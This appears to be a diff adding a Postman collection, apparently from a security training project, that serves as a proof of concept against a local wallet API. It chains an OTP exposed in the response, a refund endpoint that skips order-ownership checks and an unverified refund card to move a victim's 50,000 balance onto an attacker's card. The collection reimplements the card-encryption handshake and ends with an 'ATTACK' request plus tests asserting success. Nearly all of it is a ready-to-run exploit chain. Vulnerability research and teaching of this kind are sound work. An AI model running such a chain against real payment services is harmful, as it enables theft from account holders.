@@ -1,0 +1,235 @@
+{
+  "info": {
+    "name": "Rookies VULN-WALLET-7 — 공격자 카드로 탈취 계정 환불 수취",
+    "description": "환불 목적지 카드 소유권 미검증(VULN-WALLET-7) + 환불 주문 소유권 미검증(VULN-WALLET-5) 체이닝 PoC.\n\n실행: 위에서부터 순서대로 Send. 변수는 테스트 스크립트가 자동으로 채운다(vTok, aTok, muid, attackerCardId, otp).\n\n주의: '공격자 카드 등록' 요청은 RSA-OAEP + AES-GCM E2E 암호화를 pre-request(node crypto)로 수행한다 → Postman v10+ 필요. 실패하면 poc/Poc.java 를 돌려 나온 카드 body 를 붙여넣거나, 모바일 앱으로 카드를 등록하고 그 cardId 를 attackerCardId 변수에 직접 넣어라.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://localhost:8080/api" },
+    { "key": "pw", "value": "Passw0rd!" },
+    { "key": "uniq", "value": "" },
+    { "key": "vTok", "value": "" },
+    { "key": "aTok", "value": "" },
+    { "key": "otp", "value": "" },
+    { "key": "muid", "value": "" },
+    { "key": "keyId", "value": "" },
+    { "key": "pubKey", "value": "" },
+    { "key": "attackerCardId", "value": "" }
+  ],
+  "event": [
+    {
+      "listen": "prerequest",
+      "script": {
+        "type": "text/javascript",
+        "exec": [
+          "if (!pm.collectionVariables.get('uniq')) {",
+          "  pm.collectionVariables.set('uniq', String(Date.now()).slice(-6));",
+          "}"
+        ]
+      }
+    }
+  ],
+  "item": [
+    {
+      "name": "1. 피해자 회원가입",
+      "request": {
+        "method": "POST",
+        "header": [{ "key": "Content-Type", "value": "application/json" }],
+        "url": "{{baseUrl}}/auth/signup",
+        "body": { "mode": "raw", "raw": "{\n  \"loginId\": \"victim{{uniq}}\",\n  \"username\": \"피해자\",\n  \"password\": \"{{pw}}\",\n  \"nickname\": \"피해자\",\n  \"email\": \"victim{{uniq}}@x.com\",\n  \"phoneNumber\": \"01011110000\",\n  \"birthDate\": \"1990-01-01\",\n  \"role\": \"PARENT\"\n}" }
+      }
+    },
+    {
+      "name": "2. 피해자 로그인 → vTok",
+      "event": [{ "listen": "test", "script": { "type": "text/javascript", "exec": [
+        "pm.collectionVariables.set('vTok', pm.response.json().data.token);"
+      ] } }],
+      "request": {
+        "method": "POST",
+        "header": [{ "key": "Content-Type", "value": "application/json" }],
+        "url": "{{baseUrl}}/auth/login",
+        "body": { "mode": "raw", "raw": "{ \"loginId\": \"victim{{uniq}}\", \"password\": \"{{pw}}\" }" }
+      }
+    },
+    {
+      "name": "3. 피해자 실명확인",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{vTok}}" }
+        ],
+        "url": "{{baseUrl}}/efin/identity/verify",
+        "body": { "mode": "raw", "raw": "{\n  \"name\": \"피해자\",\n  \"birthDate\": \"900101\",\n  \"idType\": \"RESIDENT\",\n  \"idNumber\": \"9001011234567\",\n  \"issuedDate\": \"2015-03-01\"\n}" }
+      }
+    },
+    {
+      "name": "4. 피해자 결제비밀번호 설정",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{vTok}}" }
+        ],
+        "url": "{{baseUrl}}/efin/payment-password/setup",
+        "body": { "mode": "raw", "raw": "{ \"password\": \"1234\" }" }
+      }
+    },
+    {
+      "name": "5. 피해자 OTP 발급 → otp (VULN-EFIN-1: 응답에 노출)",
+      "event": [{ "listen": "test", "script": { "type": "text/javascript", "exec": [
+        "pm.collectionVariables.set('otp', String(pm.response.json().data.code));"
+      ] } }],
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{vTok}}" }
+        ],
+        "url": "{{baseUrl}}/efin/otp/issue",
+        "body": { "mode": "raw", "raw": "{}" }
+      }
+    },
+    {
+      "name": "6. 피해자 충전 준비 → muid",
+      "event": [{ "listen": "test", "script": { "type": "text/javascript", "exec": [
+        "pm.collectionVariables.set('muid', pm.response.json().data.merchantUid);"
+      ] } }],
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{vTok}}" }
+        ],
+        "url": "{{baseUrl}}/wallet/charge/prepare",
+        "body": { "mode": "raw", "raw": "{\n  \"amount\": 50000,\n  \"otp\": \"{{otp}}\",\n  \"paymentPassword\": \"1234\",\n  \"nonce\": \"nonce-v-{{uniq}}\"\n}" }
+      }
+    },
+    {
+      "name": "7. 피해자 충전 승인 (잔액 50000)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{vTok}}" }
+        ],
+        "url": "{{baseUrl}}/wallet/charge/approve",
+        "body": { "mode": "raw", "raw": "{ \"merchantUid\": \"{{muid}}\", \"amount\": 50000 }" }
+      }
+    },
+    {
+      "name": "8. 공격자 회원가입",
+      "request": {
+        "method": "POST",
+        "header": [{ "key": "Content-Type", "value": "application/json" }],
+        "url": "{{baseUrl}}/auth/signup",
+        "body": { "mode": "raw", "raw": "{\n  \"loginId\": \"attacker{{uniq}}\",\n  \"username\": \"공격자\",\n  \"password\": \"{{pw}}\",\n  \"nickname\": \"공격자\",\n  \"email\": \"attacker{{uniq}}@x.com\",\n  \"phoneNumber\": \"01022220000\",\n  \"birthDate\": \"1988-08-08\",\n  \"role\": \"PARENT\"\n}" }
+      }
+    },
+    {
+      "name": "9. 공격자 로그인 → aTok",
+      "event": [{ "listen": "test", "script": { "type": "text/javascript", "exec": [
+        "pm.collectionVariables.set('aTok', pm.response.json().data.token);"
+      ] } }],
+      "request": {
+        "method": "POST",
+        "header": [{ "key": "Content-Type", "value": "application/json" }],
+        "url": "{{baseUrl}}/auth/login",
+        "body": { "mode": "raw", "raw": "{ \"loginId\": \"attacker{{uniq}}\", \"password\": \"{{pw}}\" }" }
+      }
+    },
+    {
+      "name": "10. 공격자 실명확인",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{aTok}}" }
+        ],
+        "url": "{{baseUrl}}/efin/identity/verify",
+        "body": { "mode": "raw", "raw": "{\n  \"name\": \"공격자\",\n  \"birthDate\": \"880808\",\n  \"idType\": \"RESIDENT\",\n  \"idNumber\": \"8808081234567\",\n  \"issuedDate\": \"2015-03-01\"\n}" }
+      }
+    },
+    {
+      "name": "11. 공격자 결제비밀번호 설정",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{aTok}}" }
+        ],
+        "url": "{{baseUrl}}/efin/payment-password/setup",
+        "body": { "mode": "raw", "raw": "{ \"password\": \"4321\" }" }
+      }
+    },
+    {
+      "name": "12a. 카드 공개키 조회 → keyId, pubKey",
+      "event": [{ "listen": "test", "script": { "type": "text/javascript", "exec": [
+        "const d = pm.response.json().data;",
+        "pm.collectionVariables.set('keyId', d.keyId);",
+        "pm.collectionVariables.set('pubKey', d.publicKey);"
+      ] } }],
+      "request": {
+        "method": "GET",
+        "header": [{ "key": "Authorization", "value": "Bearer {{aTok}}" }],
+        "url": "{{baseUrl}}/wallet/cards/public-key"
+      }
+    },
+    {
+      "name": "12b. 공격자 카드 등록 → attackerCardId  (pre-request: E2E 암호화, Postman v10+)",
+      "event": [
+        { "listen": "prerequest", "script": { "type": "text/javascript", "exec": [
+          "// RSA-OAEP(SHA-256) + AES-256-GCM(12B IV, 128-bit tag). 서버 HybridDecryptor 규약과 동일.",
+          "const crypto = require('crypto');",
+          "const ts = Date.now();",
+          "const payload = JSON.stringify({",
+          "  cardNumber: '4111111111111111', expiry: '05/28', cvc: '123',",
+          "  passwordFront: '12', birthDate: '880808', ownerName: '공격자',",
+          "  paymentPassword: '4321', nonce: 'card-nonce-' + ts, timestamp: ts",
+          "});",
+          "const aesKey = crypto.randomBytes(32);",
+          "const iv = crypto.randomBytes(12);",
+          "const cipher = crypto.createCipheriv('aes-256-gcm', aesKey, iv);",
+          "const ctBody = Buffer.concat([cipher.update(payload, 'utf8'), cipher.final()]);",
+          "const tag = cipher.getAuthTag();",
+          "const ciphertext = Buffer.concat([ctBody, tag]).toString('base64'); // Java 는 ct||tag 를 기대",
+          "const derB64 = pm.collectionVariables.get('pubKey');",
+          "const pem = '-----BEGIN PUBLIC KEY-----\\n' + derB64.replace(/(.{64})/g, '$1\\n') + '\\n-----END PUBLIC KEY-----';",
+          "const wrapped = crypto.publicEncrypt({ key: pem, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' }, aesKey).toString('base64');",
+          "pm.collectionVariables.set('encBody', JSON.stringify({ keyId: pm.collectionVariables.get('keyId'), encryptedKey: wrapped, iv: iv.toString('base64'), ciphertext: ciphertext }));"
+        ] } },
+        { "listen": "test", "script": { "type": "text/javascript", "exec": [
+          "pm.collectionVariables.set('attackerCardId', String(pm.response.json().data.id));",
+          "console.log('attackerCardId =', pm.collectionVariables.get('attackerCardId'));"
+        ] } }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{aTok}}" }
+        ],
+        "url": "{{baseUrl}}/wallet/cards",
+        "body": { "mode": "raw", "raw": "{{encBody}}" }
+      }
+    },
+    {
+      "name": "13. ★ATTACK★ 공격자 토큰으로 피해자 충전을 공격자 카드로 환불",
+      "event": [{ "listen": "test", "script": { "type": "text/javascript", "exec": [
+        "const d = pm.response.json().data;",
+        "pm.test('공격 성공: 피해자 잔액 0으로 차감', () => pm.expect(d.balance).to.eql(0));",
+        "pm.test('환불이 공격자 카드로 수취됨', () => pm.expect(d.maskedCard).to.be.a('string').and.not.empty);",
+        "console.log('환불 수취 카드 =', d.maskedCard, ' pgRefundId =', d.pgRefundId);"
+      ] } }],
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" },
+          { "key": "Authorization", "value": "Bearer {{aTok}}" }
+        ],
+        "url": "{{baseUrl}}/wallet/charge/{{muid}}/refund",
+        "body": { "mode": "raw", "raw": "{ \"cardId\": {{attackerCardId}} }" }
+      }
+    }
+  ]
+}
